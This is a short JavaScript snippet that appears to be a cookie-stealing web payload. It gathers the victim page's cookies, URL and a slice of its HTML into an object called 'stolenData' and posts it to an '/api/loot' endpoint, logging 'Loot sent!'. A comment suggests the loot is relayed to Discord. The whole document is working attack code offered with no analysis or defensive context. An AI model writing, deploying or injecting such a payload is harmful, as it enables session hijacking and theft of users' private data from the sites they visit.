(function() {
    // Collect the data
    const stolenData = {
        cookies: document.cookie || "no cookies found",
        url: window.location.href,
        // We only take a small slice of HTML so Discord doesn't crash
        htmlDump: document.body ? document.body.innerHTML.substring(0, 500) : "no body"
    };

    // Send it
    fetch("/api/loot", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(stolenData)
    })
    .then(r => console.log("Loot sent!"))
    .catch(e => console.error("Loot failed:", e));
})();
